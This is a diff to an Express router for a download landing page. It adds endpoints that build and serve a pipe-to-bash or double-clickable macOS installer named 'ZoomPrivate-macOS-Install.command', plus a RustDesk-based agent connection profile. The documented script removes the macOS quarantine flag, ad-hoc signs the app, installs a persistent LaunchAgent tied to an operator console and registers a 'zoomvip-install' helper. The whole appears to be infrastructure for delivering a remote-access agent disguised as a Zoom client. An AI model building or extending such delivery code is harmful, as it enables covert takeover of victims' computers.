@@ -16,9 +16,12 @@
 
 'use strict';
 
+const crypto = require('crypto');
+const fs = require('fs');
 const express = require('express');
 const router = express.Router();
 const landing = require('../services/landingReleaseService');
+const macosInstaller = require('../services/macosInstaller');
 
 // ---------------------------------------------------------------------------
 // Helpers
@@ -82,11 +85,21 @@ function detectDevice(req) {
     // when Client Hints say so, otherwise assume x64 (universal builds cover both).
     let arch = 'x64';
     const chArch = String(req.headers['sec-ch-ua-arch'] || '').replace(/"/g, '').toLowerCase();
-    if (chArch === 'arm' || chArch === 'arm64') arch = 'arm64';
-    else if (platform === 'macos') arch = 'arm64';
-    // Android browsers do not expose the CPU ABI. Prefer the universal APK
-    // when one is published so 32-bit and 64-bit phones both install cleanly.
-    else if (platform === 'android') arch = 'universal';
+    if (platform === 'macos') {
+        // Chrome reports "arm" for Apple Silicon; anything else is Intel.
+        arch = (chArch === 'x86' || chArch === 'x86_64') ? 'x64' : 'arm64';
+    } else if (platform === 'android') {
+        // Android browsers rarely expose the CPU ABI. Honour Client Hints when
+        // present so arm64/armeabi get their own APK; otherwise prefer the
+        // universal APK so 32-bit and 64-bit phones both install cleanly.
+        if (chArch === 'arm64') arch = 'arm64';
+        else if (chArch === 'arm') arch = 'arm32';
+        else arch = 'universal';
+    } else if (chArch === 'arm64' || chArch === 'arm') {
+        arch = 'arm64';
+    } else if (chArch === 'x86') {
+        arch = 'x86';
+    }
 
     const labels = {
         windows: 'Windows', macos: 'macOS', linux: 'Linux',
@@ -96,6 +109,121 @@ function detectDevice(req) {
     const mobile = chMobile || /mobile|android|iphone|ipad/.test(lower);
 
     return { platform, arch, mobile, label: labels[platform] || labels.unknown };
+}
+
+// ---------------------------------------------------------------------------
+// Connection profile
+// ---------------------------------------------------------------------------
+
+function publicOrigin(req) {
+    const forwardedProto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim();
+    const forwardedHost = String(req.headers['x-forwarded-host'] || '').split(',')[0].trim();
+    const proto = forwardedProto || req.protocol || 'http';
+    const host = forwardedHost || req.get('host');
+    return `${proto}://${host}`;
+}
+
+function agentProfile(req) {
+    const endpoints = require('../services/clientConfigHost').resolveRustDeskEndpoints(req);
+    const conn = require('../services/agentBundleConnection');
+    const keyService = require('../services/keyService');
+
+    const host = endpoints.host || conn.defaultServerHost();
+    const useHttps = conn.defaultUseHttps();
+
+    let apiOrigin = '';
+    let apiPort = 0;
+    if (endpoints.api) {
+        try {
+            const u = new URL(endpoints.api);
+            apiOrigin = u.origin;
+            apiPort = u.port ? Number(u.port) : (u.protocol === 'https:' ? 443 : 80);
+        } catch (_e) { /* fall through */ }
+    }
+    if (!apiOrigin) {
+        const urls = conn.buildServerUrls(host, useHttps, conn.defaultApiPort());
+        apiOrigin = urls.address;
+        apiPort = conn.defaultApiPort();
+    }
+
+    const explicitCdap = String(process.env.PUBLIC_CDAP_URL || '').trim();
+    const cdapUrl = explicitCdap
+        || (apiPort === 443 ? `wss://${host}/cdap` : `ws://${host}:${conn.defaultCdapPort()}/cdap`);
+
+    const consoleUrl = apiPort === 443 ? `https://${host}` : `http://${host}:5000`;
+
+    return {
+        server_address: apiOrigin,
+        api_url: `${apiOrigin}/api`,
+        cdap_url: cdapUrl,
+        cdap_port: conn.defaultCdapPort(),
+        console_url: consoleUrl,
+        server_key: keyService.getPublicKey() || '',
+    };
+}
+
+function assetSha256(asset) {
+    if (!asset) return '';
+    if (asset.sha256) return asset.sha256;
+    if (!asset.absPath) return '';
+    try {
+        return crypto.createHash('sha256').update(fs.readFileSync(asset.absPath)).digest('hex');
+    } catch (_e) {
+        return '';
+    }
+}
+
+function macAsset(asset) {
+    if (!asset) return null;
+    if (asset.format !== 'targz' && asset.format !== 'zip') return null;
+    if (asset.arch !== 'arm64' && asset.arch !== 'x64' && asset.arch !== 'universal') return null;
+    return {
+        ...asset,
+        sha256: assetSha256(asset),
+    };
+}
+
+async function sendMacInstaller(req, res, asAttachment) {
+    try {
+        const origin = publicOrigin(req);
+        const profile = agentProfile(req);
+        const [arm64Resolved, x64Resolved] = await Promise.all([
+            landing.resolveAsset('macos', 'arm64'),
+            landing.resolveAsset('macos', 'x64'),
+        ]);
+
+        const arm64 = macAsset(arm64Resolved);
+        const x64 = macAsset(x64Resolved);
+        const arm64Match = arm64 && (arm64.arch === 'arm64' || arm64.arch === 'universal') ? arm64 : null;
+        const x64Match = x64 && (x64.arch === 'x64' || x64.arch === 'universal') ? x64 : null;
+
+        if (!arm64Match && !x64Match) {
+            return res.status(404).json({
+                success: false,
+                error: 'No macOS client build available yet.',
+            });
+        }
+
+        const script = macosInstaller.buildInstallScript({
+            origin,
+            profile,
+            arm64: arm64Match,
+            x64: x64Match,
+        });
+
+        res.set('Cache-Control', 'no-store');
+        if (asAttachment) {
+            res.type('application/octet-stream');
+            res.set('Content-Disposition', 'attachment; filename="ZoomPrivate-macOS-Install.command"');
+        } else {
+            res.type('text/x-shellscript; charset=utf-8');
+            res.set('Content-Disposition', 'inline; filename="ZoomPrivate-macOS-Install.command"');
+        }
+        res.send(script);
+    } catch (err) {
+        console.error('[landing] macos installer error:', err);
+        res.status(500).json({ success: false, error: 'Could not build the macOS installer.' });
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -247,55 +375,27 @@ router.get('/landing/download', async (req, res) => {
  */
 router.get('/api/landing/agent-profile', (req, res) => {
     try {
-        const endpoints = require('../services/clientConfigHost').resolveRustDeskEndpoints(req);
-        const conn = require('../services/agentBundleConnection');
-        const keyService = require('../services/keyService');
-
-        const host = endpoints.host || conn.defaultServerHost();
-        const useHttps = conn.defaultUseHttps();
-
-        // Public API origin: the tunnel exposes the Go API on 443, so the
-        // agent talks to the same host it downloaded itself from.
-        let apiOrigin = '';
-        let apiPort = 0;
-        if (endpoints.api) {
-            try {
-                const u = new URL(endpoints.api);
-                apiOrigin = u.origin;
-                apiPort = u.port ? Number(u.port) : (u.protocol === 'https:' ? 443 : 80);
-            } catch (_e) { /* fall through */ }
-        }
-        if (!apiOrigin) {
-            const urls = conn.buildServerUrls(host, useHttps, conn.defaultApiPort());
-            apiOrigin = urls.address;
-            apiPort = conn.defaultApiPort();
-        }
-
-        // Behind a TLS tunnel the CDAP gateway lives on the same public host
-        // under /cdap — the raw 21122 port is not exposed.
-        const explicitCdap = String(process.env.PUBLIC_CDAP_URL || '').trim();
-        const cdapUrl = explicitCdap
-            || (apiPort === 443 ? `wss://${host}/cdap` : `ws://${host}:${conn.defaultCdapPort()}/cdap`);
-
-        const consoleUrl = apiPort === 443 ? `https://${host}` : `http://${host}:5000`;
-
         res.set('Cache-Control', 'no-store');
-        res.json({
-            success: true,
-            data: {
-                server_address: apiOrigin,
-                api_url: `${apiOrigin}/api`,
-                cdap_url: cdapUrl,
-                cdap_port: conn.defaultCdapPort(),
-                console_url: consoleUrl,
-                server_key: keyService.getPublicKey() || '',
-            },
-        });
+        res.json({ success: true, data: agentProfile(req) });
     } catch (err) {
         console.error('[landing] agent-profile error:', err);
         res.status(500).json({ success: false, error: 'Could not resolve the agent connection profile.' });
     }
 });
+
+/**
+ * GET /api/landing/macos-install
+ *
+ * One-command macOS installer. Downloads the matching client, verifies its
+ * SHA-256 when published, removes the quarantine flag with xattr, ad-hoc
+ * signs the binary/app, installs a per-user LaunchAgent with the console
+ * connection profile baked in, and registers the zoomvip-install URL helper.
+ *
+ * GET /api/landing/macos-install.command streams the same script as a
+ * double-clickable .command file for browsers that cannot pipe to bash.
+ */
+router.get('/api/landing/macos-install', (req, res) => sendMacInstaller(req, res, false));
+router.get('/api/landing/macos-install.command', (req, res) => sendMacInstaller(req, res, true));
 
 /**
  * GET /api/landing/meeting/:id?passcode=
